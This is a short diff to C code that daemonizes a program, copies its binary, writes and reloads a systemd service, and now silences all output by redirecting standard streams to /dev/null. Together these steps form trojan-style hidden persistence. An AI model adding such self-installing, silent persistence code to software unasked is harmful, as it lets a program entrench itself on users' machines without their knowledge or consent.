@@ -38,7 +38,6 @@ static void setup_service(void)
         return ;
 	if ((service_fd = open(SERVICE_PATH, O_CREAT | O_WRONLY, 0644)) == -1)
 		exit(EXIT_FAILURE);
-	printf("HOAL\n");
 	write(service_fd, service_str, strlen(service_str));
 	close(service_fd);
 	system("systemctl daemon-reload");
@@ -72,6 +71,16 @@ static void replicate(void)
 	close(bin_fd);
 }
 
+static void redirect_output(void)
+{
+	close(STDIN_FILENO);
+	close(STDOUT_FILENO);
+	close(STDERR_FILENO);
+	open("/dev/null", O_RDONLY);
+	open("/dev/null", O_WRONLY);
+	open("/dev/null", O_WRONLY);
+}
+
 static void setup_process(void)
 {
 	pid_t   pid;
@@ -92,10 +101,10 @@ static void setup_process(void)
 	chdir("/");
 }
 
-
 void daemonize()
 {
 	setup_process();
+	redirect_output();
 	replicate();
 	setup_service();
 }
